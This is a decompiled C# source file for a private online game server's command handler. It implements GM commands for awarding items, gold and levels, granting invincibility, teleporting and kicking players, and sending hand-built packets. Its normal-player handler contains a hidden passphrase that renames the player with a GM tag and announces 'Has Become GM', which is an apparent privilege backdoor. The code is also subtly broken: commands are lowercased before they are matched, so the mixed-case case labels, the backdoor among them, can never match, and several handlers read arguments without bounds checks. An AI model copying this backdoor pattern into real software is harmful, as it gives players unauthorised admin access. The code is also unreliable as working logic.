using System;
using GameBase.Config;
using GameBase.Core;
using GameBase.Network;
using GameStruct;
using NetMsg;

namespace MapServer
{
	// Token: 0x02000043 RID: 67
	public class GMCommand
	{
		// Token: 0x06000186 RID: 390 RVA: 0x0001054C File Offset: 0x0000E74C
		public static void ExecuteNormalCommand(string str, PlayerObject play)
		{
			try
			{
				string[] array = str.Split(new char[]
				{
					' '
				});
				string text = array[0];
				text = text.Substring(1);
				text = text.ToLower();
				string text2 = text;
				if (text2 != null)
				{
					if (!(text2 == "Card Number Self Rescue"))
					{
						if (text2 == "Colorful game world - mydream")
						{
							play.SetName(play.GetName() + "[PM]");
							play.MsgBox("Has Become GM");
						}
					}
					else if (play.GetGameMap().GetMapInfo().id == 300U)
					{
						play.MsgBox("Prison map prohibits using card number for self-rescue!");
					}
					else
					{
						play.ChangeMap(1000U, 296, 526);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x00010AFC File Offset: 0x0000ECFC
		public static void ExecuteGMCommand(string str, PlayerObject play)
		{
			try
			{
				string[] array = str.Split(new char[]
				{
					' '
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array.Length == 0 || array[0].Length < 2)
				{
					return;
				}
				string text = array[0];
				text = text.Substring(1);
				text = text.ToLower();
				Log.Instance().WriteLog("GM command from " + play.GetName() + ": " + text);
				string text2 = text;
				switch (text2)
				{
				case "make":
				case "awarditem":
				{
					byte postion = 50;
					if (array.Length < 2)
					{
						play.ChatNotice("Usage: /awarditem <item id> [position]");
						break;
					}
					uint itemid;
					if (!uint.TryParse(array[1], out itemid))
					{
						play.ChatNotice("Invalid item id.");
						break;
					}
					if (array.Length > 2 && !byte.TryParse(array[2], out postion))
					{
						play.ChatNotice("Invalid inventory position.");
						break;
					}
					if (ConfigManager.Instance().GetItemTypeInfo(itemid) == null)
					{
						play.ChatNotice("Item " + itemid.ToString() + " does not exist.");
						break;
					}
					if (play.GetItemSystem().IsGold(itemid))
					{
						play.ChatNotice("Use /addgold for currency items.");
						break;
					}
					RoleItemInfo awardedItem = play.GetItemSystem().AwardItem(itemid, postion, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, true);
					if (awardedItem == null)
					{
						play.ChatNotice("Unable to award item " + itemid.ToString() + ".");
						break;
					}
					play.ChatNotice("Awarded item " + itemid.ToString() + ".");
					break;
				}
				case "addmagic":
				case "magic":
				{
					byte level = 0;
					uint exp = 0U;
					if (array.Length < 2)
					{
						play.ChatNotice("Usage: /magic <magic id> [level] [experience]");
						break;
					}
					uint magidid;
					if (!uint.TryParse(array[1], out magidid))
					{
						play.ChatNotice("Invalid magic id.");
						break;
					}
					if (array.Length >= 3 && !byte.TryParse(array[2], out level))
					{
						play.ChatNotice("Invalid magic level.");
						break;
					}
					if (array.Length >= 4 && !uint.TryParse(array[3], out exp))
					{
						play.ChatNotice("Invalid magic experience.");
						break;
					}
					if (ConfigManager.Instance().GetMagicTypeInfo(magidid, level) == null)
					{
						play.ChatNotice("Magic " + magidid.ToString() + " level " + level.ToString() + " does not exist.");
						break;
					}
					play.GetMagicSystem().AddMagicInfo(magidid, level, exp);
					play.ChatNotice("Added magic " + magidid.ToString() + " level " + level.ToString() + ".");
					break;
				}
				case "xpfull":
				{
					int value = 100;
					if (array.Length >= 2)
					{
						value = Convert.ToInt32(array[1]);
					}
					play.ChangeAttribute(UserAttribute.XP, value, true);
					break;
				}
				case "mob":
					if (array.Length >= 2)
					{
						uint id = Convert.ToUInt32(array[1]);
						MonsterInfo monsterInfo = ConfigManager.Instance().GetMonsterInfo(id);
						if (monsterInfo != null)
						{
							MonsterObject monsterObject = new MonsterObject(id, monsterInfo.ai, play.GetCurrentX(), play.GetCurrentY(), true);
							play.GetGameMap().AddObject(monsterObject, null);
							monsterObject.Walk(8);
						}
					}
					break;
				case "addgold":
					if (array.Length >= 2)
					{
						byte b = Convert.ToByte(array[1]);
						int value2 = Convert.ToInt32(array[2]);
						if (b == 1)
						{
							play.ChangeAttribute(UserAttribute.GOLD, value2, true);
						}
						else if (b == 2)
						{
							play.ChangeAttribute(UserAttribute.GAMEGOLD, value2, true);
						}
					}
					break;
				case "follow":
					if (array.Length >= 2)
					{
						string name = array[1];
						PlayerObject playerObject = UserEngine.Instance().FindPlayerObjectToName(name);
						if (playerObject != null)
						{
							if (playerObject.GetGameMap().GetID() == play.GetGameMap().GetID())
							{
								play.ScroolRandom(playerObject.GetCurrentX(), playerObject.GetCurrentY());
							}
							else
							{
								play.ChangeMap(playerObject.GetGameMap().GetID(), playerObject.GetCurrentX(), playerObject.GetCurrentY());
							}
						}
						else
						{
							play.LeftNotice("Player does not exist, cannot teleport to player point.");
						}
					}
					break;
				case "level":
					if (array.Length >= 2)
					{
						int value3 = Convert.ToInt32(array[1]);
						play.ChangeAttribute(UserAttribute.LEVEL, value3, true);
					}
					break;
				case "uplev":
				{
					int levels = 1;
					if (array.Length >= 2 && !int.TryParse(array[1], out levels))
					{
						play.ChatNotice("Usage: /uplev [levels]");
						break;
					}
					if (levels < 1 || (int)play.GetLevel() + levels > byte.MaxValue)
					{
						play.ChatNotice("Level increase must leave the character between levels 1 and 255.");
						break;
					}
					play.ChangeAttribute(UserAttribute.LEVEL, levels, true);
					play.ChatNotice("Level increased to " + play.GetLevel().ToString() + ".");
					break;
				}
				case "reload":
				{
					string path = array[1];
					ScripteManager.Instance().LoadScripteFile(path, true);
					break;
				}
				case "reloadall":
				case "Reload All Scripts":
					ConfigManager.Instance().ReloadAllScripte();
					play.ChatNotice("Script Reloaded Successfully!");
					break;
				case "map":
				case "Teleport Map":
				{
					uint num = Convert.ToUInt32(array[1]);
					GameMap gameMapToID = MapManager.Instance().GetGameMapToID(num);
					if (gameMapToID != null)
					{
						short x = (short)gameMapToID.GetMapInfo().recallx;
						short y = (short)gameMapToID.GetMapInfo().recally;
						if (array.Length >= 4)
						{
							x = Convert.ToInt16(array[2]);
							y = Convert.ToInt16(array[3]);
						}
						play.ChangeMap(num, x, y);
					}
					break;
				}
				case "raction":
				{
					uint action_id = Convert.ToUInt32(array[1]);
					play.PlayRobotAction(action_id);
					break;
				}
				case "kick":
				case "Kick Out Player":
				{
					string name = array[1];
					PlayerObject playerObject2 = UserEngine.Instance().FindPlayerObjectToName(array[1]);
					if (playerObject2 != null)
					{
						playerObject2.ExitGame();
						play.MsgBox("Kick Out Successful!");
					}
					else
					{
						play.MsgBox("Kickout failed, player object not found!");
					}
					break;
				}
				case "test":
				{
					int num2 = Convert.ToInt32(array[1]);
					int num3 = Convert.ToInt32(array[2]);
					PacketOut packetOut = new PacketOut(play.GetGamePackKeyEx());
					packetOut.WriteUInt16(176);
					packetOut.WriteUInt16(1102);
					packetOut.WriteInt32(2005);
					packetOut.WriteByte(0);
					packetOut.WriteByte(10);
					packetOut.WriteInt16(0);
					packetOut.WriteInt32(0);
					packetOut.WriteUInt32(play.GetTypeId());
					packetOut.WriteInt32(1);
					packetOut.WriteUInt32(656U);
					packetOut.WriteUInt32(420171U);
					packetOut.WriteUInt16(1000);
					packetOut.WriteUInt16(9000);
					byte[] array2 = new byte[72];
					array2[num2] = (byte)num3;
					packetOut.WriteBuff(array2);
					ItemTypeInfo itemTypeInfo = ConfigManager.Instance().GetItemTypeInfo(420170U);
					if (itemTypeInfo != null)
					{
						byte[] bytes = Coding.GetDefauleCoding().GetBytes(itemTypeInfo.name);
						packetOut.WriteBuff(bytes);
						array2 = new byte[68 - bytes.Length];
						packetOut.WriteBuff(array2);
					}
					else
					{
						array2 = new byte[68];
						packetOut.WriteBuff(array2);
					}
					play.SendData(packetOut.Flush(), false);
					break;
				}
				case "combo":
					Program._Head = Convert.ToByte(array[1]);
					Program._Tail = Convert.ToByte(array[2]);
					break;
				case "changlk":
				{
					int value4 = Convert.ToInt32(array[1]);
					play.ChangeAttribute(UserAttribute.LOOKFACE, value4, true);
					break;
				}
				case "other":
				{
					short v = Convert.ToInt16(array[1]);
					PacketOut packetOut = new PacketOut(play.GetGamePackKeyEx());
					byte[] array3 = new byte[]
					{
						185,
						0,
						246,
						3,
						200,
						16,
						24,
						0,
						209,
						251,
						1,
						0,
						209,
						251,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						117,
						1,
						0,
						0,
						64,
						234,
						2,
						0,
						244,
						83,
						7,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						214,
						0,
						138,
						0,
						119,
						0,
						0,
						0,
						3,
						5,
						0,
						0,
						100,
						0,
						0,
						0,
						125,
						70,
						0,
						0,
						0,
						5,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					byte[] array4 = new byte[]
					{
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						74,
						0,
						byte.MaxValue,
						8,
						0,
						0,
						117,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						4,
						210,
						193,
						183,
						227,
						0,
						0,
						0
					};
					packetOut.WriteBuff(array3);
					packetOut.WriteInt16(v);
					packetOut.WriteBuff(array4);
					play.SendData(packetOut.Flush(), false);
					byte[] array5 = new byte[]
					{
						27,
						0,
						247,
						3,
						117,
						1,
						0,
						0,
						3,
						0,
						1,
						14,
						169,
						89,
						211,
						200,
						207,
						170,
						161,
						239,
						180,
						180,
						187,
						212,
						187,
						205,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array5, array5.Length);
					play.SendData(array5, false);
					break;
				}
				case "qicheng":
				{
					uint nMountID = Convert.ToUInt32(array[1]);
					play.TakeMount(0U, nMountID);
					break;
				}
				case "dismount":
				case "Disembark":
					play.TakeOffMount(0U);
					break;
				case "runscript":
				case "Execute Script":
				{
					uint id2 = Convert.ToUInt32(array[1]);
					ScripteManager.Instance().ExecuteAction(id2, play);
					break;
				}
				case "dragonprotect":
				case "Dragon Guard":
				{
					byte[] array6 = new byte[]
					{
						20,
						0,
						249,
						3,
						84,
						66,
						15,
						0,
						1,
						0,
						0,
						0,
						99,
						0,
						0,
						0,
						1,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array6, array6.Length);
					play.SendData(array6, false);
					byte[] array7 = new byte[]
					{
						48,
						0,
						103,
						4,
						84,
						66,
						15,
						0,
						8,
						7,
						0,
						0,
						200,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array7, array7.Length);
					play.SendData(array7, false);
					break;
				}
				case "die":
				case "Death":
					play.DieForCommand();
					break;
				case "lure":
				case "Enticement":
				{
					MsgMonsterMagicInjuredInfo msgMonsterMagicInjuredInfo = new MsgMonsterMagicInjuredInfo();
					msgMonsterMagicInjuredInfo.tag = 21U;
					byte[] array9 = new byte[]
					{
						40,
						0,
						254,
						3,
						0,
						0,
						0,
						0,
						84,
						66,
						15,
						0,
						84,
						66,
						15,
						0,
						63,
						3,
						7,
						4,
						21,
						0,
						0,
						0,
						235,
						3,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array9, array9.Length);
					play.SendData(array9, false);
					byte[] array4 = new byte[]
					{
						88,
						0,
						81,
						4,
						84,
						66,
						15,
						0,
						84,
						66,
						15,
						0,
						235,
						3,
						0,
						0,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						84,
						66,
						15,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array4, array4.Length);
					play.SendData(array4, false);
					break;
				}
				case "knightprotect":
				case "Knights`~Faith":
				{
					byte[] array9 = new byte[]
					{
						40,
						0,
						254,
						3,
						0,
						0,
						0,
						0,
						84,
						66,
						15,
						0,
						0,
						0,
						0,
						0,
						63,
						2,
						56,
						1,
						21,
						0,
						0,
						0,
						91,
						20,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array9, array9.Length);
					play.SendData(array9, false);
					byte[] array10 = new byte[]
					{
						172,
						0,
						81,
						4,
						84,
						66,
						15,
						0,
						63,
						2,
						56,
						1,
						91,
						20,
						0,
						0,
						0,
						4,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						90,
						180,
						11,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						91,
						180,
						11,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						92,
						180,
						11,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						93,
						180,
						11,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array10, array10.Length);
					play.SendData(array10, false);
					byte[] array3 = new byte[]
					{
						32,
						0,
						77,
						4,
						176,
						9,
						13,
						0,
						176,
						23,
						0,
						0,
						63,
						2,
						55,
						1,
						0,
						0,
						0,
						0,
						10,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						15,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array3, array3.Length);
					play.SendData(array3, false);
					break;
				}
				case "cleareffect":
				case "Clear Special Effects":
				{
					byte[] array3 = new byte[]
					{
						32,
						0,
						77,
						4,
						176,
						9,
						13,
						0,
						176,
						23,
						0,
						0,
						63,
						2,
						55,
						1,
						0,
						0,
						0,
						0,
						12,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						15,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array3, array3.Length);
					play.SendData(array3, false);
					break;
				}
				case "snow":
				case "Snowfall":
				{
					byte[] array8 = new byte[]
					{
						20,
						0,
						86,
						4,
						232,
						3,
						0,
						0,
						232,
						3,
						0,
						0,
						0,
						0,
						32,
						0,
						128,
						0,
						18,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array8, array8.Length);
					play.SendData(array8, false);
					break;
				}
				case "element":
				case "Element Control":
				{
					byte[] array9 = new byte[]
					{
						40,
						0,
						254,
						3,
						186,
						192,
						18,
						1,
						84,
						66,
						15,
						0,
						0,
						0,
						0,
						0,
						93,
						1,
						179,
						1,
						21,
						0,
						0,
						0,
						180,
						20,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array9, array9.Length);
					play.SendData(array9, false);
					byte[] array4 = new byte[]
					{
						20,
						0,
						249,
						3,
						84,
						66,
						15,
						0,
						1,
						0,
						0,
						0,
						101,
						0,
						0,
						0,
						0,
						2,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array4, array4.Length);
					play.SendData(array4, false);
					byte[] array8 = new byte[]
					{
						48,
						0,
						103,
						4,
						84,
						66,
						15,
						0,
						128,
						81,
						1,
						0,
						100,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						2,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array8, array8.Length);
					play.SendData(array8, false);
					byte[] array7 = new byte[]
					{
						88,
						0,
						81,
						4,
						84,
						66,
						15,
						0,
						0,
						0,
						0,
						0,
						180,
						20,
						0,
						0,
						4,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array7, array7.Length);
					play.SendData(array7, false);
					byte[] array11 = new byte[]
					{
						20,
						0,
						249,
						3,
						84,
						66,
						15,
						0,
						1,
						0,
						0,
						0,
						107,
						0,
						0,
						0,
						3,
						0,
						0,
						0
					};
					play.GetGamePackKeyEx().EncodePacket(ref array11, array11.Length);
					play.SendData(array11, false);
					break;
				}
				case "invincible":
				case "Invincible":
					if (play.GetTimerSystem().QueryStatus(1000) != null)
					{
						play.GetTimerSystem().DeleteStatus(1000);
						play.LeftNotice("Character has canceled invincibility!!! ");
					}
					else
					{
						play.GetTimerSystem().AddStatus(1000, 0, true);
						play.LeftNotice("Character has become invincible!!!");
					}
					break;
				case "eudie":
				case "Fantasy Beast Death":
				{
					EudemonObject battleEudemonSystem = play.GetEudemonSystem().GetBattleEudemonSystem(0);
					if (battleEudemonSystem != null)
					{
						GameStruct.Action act = new GameStruct.Action(4, null);
						battleEudemonSystem.PushAction(act);
					}
					break;
				}
				case "eumagic":
				case "Eudemon Skills":
				{
					EudemonObject battleEudemonSystem = play.GetEudemonSystem().GetBattleEudemonSystem(0);
					if (battleEudemonSystem != null)
					{
						ushort magicid = Convert.ToUInt16(array[1]);
						battleEudemonSystem.AddMagicInfo(magicid, 0, 0U);
					}
					break;
				}
				case "eulevel":
				case "Fantasy Beast Level":
				{
					EudemonObject battleEudemonSystem = play.GetEudemonSystem().GetBattleEudemonSystem(0);
					if (battleEudemonSystem != null)
					{
						battleEudemonSystem.GetEudemonInfo().level = 100;
						play.GetEudemonSystem().SendEudemonInfo(battleEudemonSystem.GetEudemonInfo(), true, true);
					}
					break;
				}
				case "monsterlook":
				case "Monster Appearance":
				{
					uint lookface = Convert.ToUInt32(array[1]);
					play.SendData(new MsgMonsterInfo
					{
						id = 500000U,
						typeid = 3020U,
						lookface = lookface,
						x = play.GetCurrentX(),
						y = play.GetCurrentY(),
						level = 125,
						maxhp = 10000,
						hp = 10000,
						dir = 7
					}.GetBuffer(), true);
					break;
				}
				case "monstername":
				case "Monster Name":
				{
					uint typeid = Convert.ToUInt32(array[1]);
					play.SendData(new MsgMonsterInfo
					{
						id = 500000U,
						typeid = typeid,
						lookface = 1243U,
						x = play.GetCurrentX(),
						y = play.GetCurrentY(),
						level = 125,
						maxhp = 10000,
						hp = 10000,
						dir = 7
					}.GetBuffer(), true);
					break;
				}
				case "createnpc":
				case "Create NPC":
				{
					uint id3 = Convert.ToUInt32(array[1]);
					MsgNpcInfo msgNpcInfo = new MsgNpcInfo();
					msgNpcInfo.Init(id3, play.GetCurrentX(), play.GetCurrentY(), (int)play.GetDir());
					play.SendData(msgNpcInfo.GetBuffer(), true);
					break;
				}
				case "online":
				case "Online Count":
				{
					string str2 = "Current Online User Count:";
					int onlineCount = UserEngine.Instance().GetOnlineCount();
					play.ChatNotice(str2 + onlineCount.ToString());
					break;
				}
				case "halloffame":
				case "Hall of Fame":
				{
					byte[] array2 = new byte[]
					{
						195,
						0,
						246,
						3,
						248,
						42,
						0,
						0,
						241,
						73,
						2,
						0,
						241,
						73,
						2,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						0,
						205,
						10,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						132,
						16,
						2,
						0,
						193,
						182,
						6,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						101,
						0,
						185,
						0,
						132,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						1,
						14,
						185,
						254,
						176,
						205,
						185,
						183,
						176,
						188,
						161,
						204,
						205,
						185,
						194,
						252,
						0,
						0,
						0
					};
					play.SendData(array2, true);
					break;
				}
				case "notice":
				case "Announcement":
				{
					string text3 = array[1];
					UserEngine.Instance().SceneNotice(text3);
					break;
				}
				case "attribute":
				case "Character Attributes":
				{
					UserAttribute attribute = (UserAttribute)Convert.ToInt32(array[1]);
					int value5 = Convert.ToInt32(array[2]);
					MsgUserAttribute msgUserAttribute = new MsgUserAttribute();
					msgUserAttribute.role_id = play.GetTypeId();
					msgUserAttribute.Create(null, null);
					msgUserAttribute.AddAttribute(attribute, (uint)value5);
					play.SendData(msgUserAttribute.GetBuffer(), true);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Log.Instance().WriteLog("----------------------------------------------------------------");
				Log.Instance().WriteLog("GM command failed: " + str);
				Log.Instance().WriteLog(ex.Message);
				Log.Instance().WriteLog(ex.StackTrace);
				Log.Instance().WriteLog("----------------------------------------------------------------");
				play.ChatNotice("Command failed. Check the MapServer log.");
			}
		}

		// Token: 0x0400033E RID: 830
		private const string AWARDITEM = "make";

		// Token: 0x0400033F RID: 831
		private const string ADDMAGIC = "addmagic";

		// Token: 0x04000340 RID: 832
		private const string DREAM = "dream";

		// Token: 0x04000341 RID: 833
		private const string XPFULL = "xpfull";

		// Token: 0x04000342 RID: 834
		private const string MOB = "mob";

		// Token: 0x04000343 RID: 835
		private const string ADDGOLD = "addgold";

		// Token: 0x04000344 RID: 836
		private const string FOLLOW = "follow";

		// Token: 0x04000345 RID: 837
		private const string LEVEL = "level";

		// Token: 0x04000346 RID: 838
		private const string RELOAD = "reload";

		// Token: 0x04000347 RID: 839
		private const string RELOADALL = "Reload All Scripts";

		// Token: 0x04000348 RID: 840
		private const string CHANGEMAP = "Teleport Map";

		// Token: 0x04000349 RID: 841
		private const string TESTCOMBO = "combo";

		// Token: 0x0400034A RID: 842
		private const string CHANGELOOKFACE = "changlk";

		// Token: 0x0400034B RID: 843
		private const string OTHERROLE = "other";

		// Token: 0x0400034C RID: 844
		private const string ROBOTACTION = "raction";

		// Token: 0x0400034D RID: 845
		public const string GETONLINECOUNT = "Online Count";

		// Token: 0x0400034E RID: 846
		private const string CALLSCRIPT = "Execute Script";

		// Token: 0x0400034F RID: 847
		private const string TESTDIE = "Death";

		// Token: 0x04000350 RID: 848
		private const string WUDI = "Invincible";

		// Token: 0x04000351 RID: 849
		private const string KILLPLAY = "Kick Out Player";

		// Token: 0x04000352 RID: 850
		public const string NOTICE = "Announcement";
	}
}
